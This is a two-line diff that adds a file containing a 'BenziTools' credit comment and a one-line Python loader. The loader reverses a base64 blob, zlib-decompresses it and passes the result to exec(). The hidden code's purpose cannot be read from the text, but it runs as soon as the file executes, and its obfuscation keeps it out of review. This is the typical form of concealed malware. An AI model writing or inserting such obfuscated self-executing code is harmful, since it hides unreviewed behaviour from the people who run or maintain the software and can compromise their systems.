@@ -1,0 +1,2 @@
+# Created by BenziTools (https://benzitools.github.io/)
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==gYuMD7Xwv6pIzdmsOVGq2Nf5/f5kLVJ2gHpRMUiPBL4yoyUB0T3QfSQaml5CS89LBkT1NbLJ8wmpxYcsvVqxdHsVqbHt+CGSPg8TmxXTw76rfYP4UAcr0JaYZoAW+uCg7FRtHJyimYYtTidENQMAjwOEDydwJe'))
